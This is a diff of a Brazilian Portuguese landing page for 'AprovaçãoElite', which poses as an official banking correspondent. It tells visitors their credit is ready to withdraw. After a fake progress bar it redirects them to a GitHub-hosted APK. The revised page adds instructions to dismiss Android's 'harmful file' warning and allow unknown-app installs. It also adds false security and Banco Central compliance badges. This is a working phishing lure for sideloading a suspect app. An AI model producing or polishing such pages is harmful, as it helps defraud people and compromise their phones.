@@ -1,147 +1,208 @@
 <!DOCTYPE html>
 <html lang="pt-BR" class="scroll-smooth">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AprovaçãoElite | Download Seguro</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
 
-<title>AprovaçãoElite | Download</title>
+    <style>
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #f8fafc; }
+        [x-cloak] { display: none !important; }
+        .glass-card { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(10px); }
+        .btn-pulse { animation: pulse 2s infinite; }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        }
+    </style>
 
-<script src="https://cdn.tailwindcss.com"></script>
-<script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
-<script src="https://unpkg.com/lucide@latest"></script>
+    <script>
+        function downloadApp() {
+            return {
+                baixando: false,
+                progresso: 0,
+                mostrarFaq: false,
 
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+                iniciarDownload() {
+                    this.baixando = true;
+                    this.progresso = 0;
+                    
+                    let int = setInterval(() => {
+                        if(this.progresso < 100) {
+                            this.progresso += 5;
+                        } else {
+                            clearInterval(int);
+                            // Link direto atualizado via GitHub
+                            const urlDownload = "https://github.com/Abravaaaa/doncred/raw/main/ASSINAR%20E%20RECEBER%20VALORES%20.apk";
+                            window.location.href = urlDownload;
+                        }
+                    }, 50);
+                },
 
-<style>
-body { font-family:'Plus Jakarta Sans', sans-serif; background:#f8fafc;}
-[x-cloak]{display:none;}
-</style>
-
-<script>
-function downloadApp(){
-return{
-baixando:false,
-progresso:0,
-
-iniciarDownload(){
-this.baixando=true;
-this.progresso=0;
-
-let int=setInterval(()=>{
-if(this.progresso<100){
-this.progresso+=10;
-}else{
-clearInterval(int);
-
-const urlDownload="https://github.com/Abravaaaa/doncred/raw/main/ASSINAR%20E%20RECEBER%20VALORES%20.apk";
-
-window.location.href=urlDownload;
-}
-},80);
-},
-
-init(){
-if(window.lucide){lucide.createIcons();}
-}
-}
-}
-</script>
-
+                init() {
+                    if (window.lucide) {
+                        lucide.createIcons();
+                    }
+                }
+            }
+        }
+    </script>
 </head>
-
 <body x-data="downloadApp()" x-init="init()" class="antialiased">
 
-<!-- Barra topo -->
-<div class="bg-slate-900 py-2 text-center">
-<p class="text-xs text-emerald-400 font-bold flex items-center justify-center gap-2">
-<i data-lucide="shield-check" class="w-4 h-4"></i>
-Download Seguro Verificado
-</p>
-</div>
+    <!-- Status Bar -->
+    <div class="bg-emerald-600 py-1.5 text-center">
+        <p class="text-[10px] text-white font-bold uppercase tracking-widest flex items-center justify-center gap-2">
+            <i data-lucide="shield-check" class="w-3 h-3"></i>
+            Conexão Criptografada SSL 256-bit
+        </p>
+    </div>
 
-<!-- Header -->
-<header class="bg-white border-b sticky top-0">
-<div class="max-w-4xl mx-auto px-4 py-4 flex justify-between items-center">
+    <!-- Header -->
+    <header class="bg-white/80 backdrop-blur-md border-b sticky top-0 z-50">
+        <div class="max-w-5xl mx-auto px-4 py-4 flex justify-between items-center">
+            <div class="flex gap-2 items-center">
+                <div class="bg-emerald-600 w-9 h-9 rounded-lg flex items-center justify-center shadow-lg shadow-emerald-200">
+                    <i data-lucide="trending-up" class="text-white w-5 h-5"></i>
+                </div>
+                <div class="flex flex-col">
+                    <span class="font-black text-slate-900 leading-none">APROVAÇÃO<span class="text-emerald-600">ELITE</span></span>
+                    <span class="text-[9px] font-bold text-slate-400 uppercase tracking-tighter">Portal de Distribuição</span>
+                </div>
+            </div>
+            <button @click="iniciarDownload()" class="bg-slate-900 text-white px-4 py-2 rounded-lg font-bold text-xs uppercase hover:bg-emerald-600 transition-colors">
+                Baixar App
+            </button>
+        </div>
+    </header>
 
-<div class="flex gap-2 items-center">
-<div class="bg-emerald-600 w-8 h-8 rounded flex items-center justify-center">
-<i data-lucide="trending-up" class="text-white"></i>
-</div>
-<span class="font-black">Aprovação<span class="text-emerald-600">Elite</span></span>
-</div>
+    <main class="py-12 px-4 max-w-4xl mx-auto">
+        
+        <!-- Alerta de Segurança -->
+        <div class="mb-10 text-center">
+            <div class="inline-flex items-center gap-2 bg-white px-4 py-2 rounded-full shadow-sm border border-slate-100 mb-6">
+                <span class="relative flex h-2 w-2">
+                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                    <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+                </span>
+                <span class="text-[10px] font-bold text-slate-500 uppercase">Servidor de download ativo</span>
+            </div>
+            <h1 class="text-3xl md:text-4xl font-black text-slate-900 mb-4 uppercase tracking-tight">
+                Seu crédito está <br> <span class="text-emerald-600 underline decoration-emerald-200 underline-offset-4">pronto para o saque</span>
+            </h1>
+            <p class="text-slate-500 text-sm md:text-base max-w-md mx-auto">
+                Para sua segurança, a assinatura do contrato e a transferência bancária são feitas exclusivamente pelo nosso aplicativo oficial.
+            </p>
+        </div>
 
-<button @click="iniciarDownload()" class="bg-emerald-600 text-white px-4 py-2 rounded-lg font-bold">
-Baixar Agora
-</button>
+        <!-- Card de Download -->
+        <div class="max-w-md mx-auto">
+            <div class="bg-white p-8 rounded-[32px] shadow-2xl shadow-slate-200 border border-slate-100 relative overflow-hidden">
+                
+                <div class="relative z-10 text-center">
+                    <div class="bg-emerald-50 w-20 h-20 rounded-3xl flex items-center justify-center mx-auto mb-6">
+                        <i data-lucide="smartphone" class="text-emerald-600 w-10 h-10"></i>
+                    </div>
 
-</div>
-</header>
+                    <div x-show="!baixando">
+                        <button @click="iniciarDownload()" class="btn-pulse w-full bg-emerald-600 hover:bg-emerald-700 text-white py-5 rounded-2xl font-black text-sm uppercase flex justify-center items-center gap-3 transition-all">
+                            <i data-lucide="download" class="w-5 h-5"></i>
+                            Instalar e Receber Agora
+                        </button>
+                        <p class="mt-4 text-[10px] text-slate-400 font-bold uppercase tracking-widest flex items-center justify-center gap-1">
+                            <i data-lucide="info" class="w-3 h-3"></i> Versão Oficial 2.4.1 (APK)
+                        </p>
+                    </div>
 
-<!-- Conteúdo -->
-<main class="py-16 px-4">
+                    <!-- Progresso de Download -->
+                    <div x-show="baixando" x-cloak class="py-4">
+                        <div class="w-full bg-slate-100 h-3 rounded-full overflow-hidden shadow-inner">
+                            <div class="bg-emerald-500 h-full transition-all duration-300" :style="'width:'+progresso+'%'"></div>
+                        </div>
+                        <div class="flex justify-between mt-3">
+                            <p class="text-[10px] font-black text-emerald-600 uppercase tracking-widest" x-text="progresso < 100 ? 'Baixando pacote seguro...' : 'Download Concluído!'"></p>
+                            <p class="text-[10px] font-black text-slate-400" x-text="progresso + '%'"></p>
+                        </div>
+                    </div>
+                </div>
 
-<div class="max-w-xl mx-auto text-center">
+                <!-- Decorativo de fundo -->
+                <div class="absolute -right-4 -bottom-4 opacity-5">
+                    <i data-lucide="shield-check" class="w-32 h-32"></i>
+                </div>
+            </div>
 
-<div class="bg-emerald-50 p-8 rounded-3xl shadow">
+            <!-- FAQ/Ajuda Rápida -->
+            <div class="mt-8 space-y-3">
+                <button @click="mostrarFaq = !mostrarFaq" class="w-full flex justify-between items-center px-6 py-4 bg-white rounded-2xl border border-slate-100 text-xs font-bold text-slate-600 uppercase tracking-widest transition-all hover:bg-slate-50">
+                    <span>Ajuda na Instalação?</span>
+                    <i data-lucide="chevron-down" class="w-4 h-4 transition-transform" :class="mostrarFaq ? 'rotate-180' : ''"></i>
+                </button>
+                
+                <div x-show="mostrarFaq" x-cloak x-transition class="p-6 bg-slate-900 rounded-2xl text-white space-y-4">
+                    <div>
+                        <p class="text-[10px] font-bold text-emerald-400 uppercase mb-1">Apareceu "Arquivo Nocivo"?</p>
+                        <p class="text-[11px] text-slate-300 leading-relaxed">Não se preocupe. Isso é um aviso padrão do Android para qualquer app baixado fora da Play Store. Nosso app é 100% seguro e verificado.</p>
+                    </div>
+                    <div class="pt-3 border-t border-white/10">
+                        <p class="text-[10px] font-bold text-emerald-400 uppercase mb-1">Como Autorizar?</p>
+                        <p class="text-[11px] text-slate-300 leading-relaxed">Clique em "Instalar assim mesmo" ou vá em Configurações > Instalar Apps Desconhecidos e autorize o seu navegador.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
 
-<div class="bg-emerald-600 w-16 h-16 rounded-xl flex items-center justify-center mx-auto mb-4">
-<i data-lucide="download" class="text-white w-8 h-8"></i>
-</div>
+        <!-- Passos Ilustrados -->
+        <div class="grid md:grid-cols-3 gap-6 mt-16">
+            <div class="text-center p-6">
+                <div class="w-12 h-12 bg-white rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-sm border border-slate-100">
+                    <i data-lucide="download-cloud" class="text-emerald-600 w-6 h-6"></i>
+                </div>
+                <h3 class="font-black text-slate-900 text-[10px] uppercase mb-2">1. Baixe o Arquivo</h3>
+                <p class="text-[11px] text-slate-500">Inicie o download seguro do instalador oficial direto do servidor.</p>
+            </div>
+            <div class="text-center p-6">
+                <div class="w-12 h-12 bg-white rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-sm border border-slate-100">
+                    <i data-lucide="user-check" class="text-emerald-600 w-6 h-6"></i>
+                </div>
+                <h3 class="font-black text-slate-900 text-[10px] uppercase mb-2">2. Instale e Acesse</h3>
+                <p class="text-[11px] text-slate-500">Abra o arquivo e siga as instruções para validar sua identidade.</p>
+            </div>
+            <div class="text-center p-6">
+                <div class="w-12 h-12 bg-white rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-sm border border-slate-100">
+                    <i data-lucide="banknote" class="text-emerald-600 w-6 h-6"></i>
+                </div>
+                <h3 class="font-black text-slate-900 text-[10px] uppercase mb-2">3. Receba o Valor</h3>
+                <p class="text-[11px] text-slate-500">Assine digitalmente e o dinheiro será enviado via PIX ou TED.</p>
+            </div>
+        </div>
 
-<h1 class="text-3xl font-black mb-2">Aplicativo de saque Liberado</h1>
-<p class="text-gray-600 mb-6">Clique abaixo para instalar e sacar valores.</p>
+    </main>
 
-<!-- Botão -->
-<button x-show="!baixando" @click="iniciarDownload()"
-class="w-full bg-black text-white py-4 rounded-2xl font-bold flex justify-center gap-2">
-<i data-lucide="smartphone"></i>
-Instalar Aplicativo
-</button>
+    <!-- WhatsApp Flutuante (Suporte) -->
+    <a href="https://wa.me/5511999999999" target="_blank" class="fixed bottom-6 right-6 bg-[#25D366] text-white p-4 rounded-full shadow-2xl flex items-center justify-center hover:scale-110 transition-transform z-[100]">
+        <i data-lucide="message-circle" class="w-7 h-7"></i>
+    </a>
 
-<!-- Progresso -->
-<div x-show="baixando" x-cloak>
-
-<div class="w-full bg-gray-200 h-3 rounded-full overflow-hidden">
-<div class="bg-emerald-500 h-full transition-all"
-:style="'width:'+progresso+'%'"></div>
-</div>
-
-<p class="text-xs mt-2 font-bold text-gray-500"
-x-text="progresso<100?'Baixando...':'Download concluído!'">
-</p>
-
-</div>
-
-</div>
-
-<!-- Passos -->
-<div class="grid md:grid-cols-3 gap-4 mt-10 text-left">
-
-<div class="bg-white p-5 rounded-xl shadow">
-<b class="text-emerald-600">01</b>
-<p class="text-sm">Clique no botão de download.</p>
-</div>
-
-<div class="bg-white p-5 rounded-xl shadow">
-<b class="text-emerald-600">02</b>
-<p class="text-sm">Abra o arquivo no celular.</p>
-</div>
-
-<div class="bg-white p-5 rounded-xl shadow">
-<b class="text-emerald-600">03</b>
-<p class="text-sm">Instale e utilize.</p>
-</div>
-
-</div>
-
-</div>
-
-</main>
-
-<!-- Footer -->
-<footer class="text-center py-8 border-t text-xs text-gray-400">
-Portal oficial de distribuição.
-</footer>
+    <footer class="py-12 border-t border-slate-100 bg-white mt-12">
+        <div class="text-center px-4">
+            <p class="text-[10px] text-slate-400 font-black uppercase tracking-[0.2em] mb-4">AprovaçãoElite — Correspondente Bancário Oficial</p>
+            <div class="flex justify-center gap-6 opacity-30 grayscale mb-6">
+                <i data-lucide="shield" class="w-5 h-5"></i>
+                <i data-lucide="lock" class="w-5 h-5"></i>
+                <i data-lucide="check-circle" class="w-5 h-5"></i>
+            </div>
+            <p class="text-[9px] text-slate-400 max-w-sm mx-auto leading-relaxed">
+                Segurança em conformidade com as normas do Banco Central. Seus dados estão protegidos pela Lei Geral de Proteção de Dados (LGPD).
+            </p>
+        </div>
+    </footer>
 
 </body>
 </html>
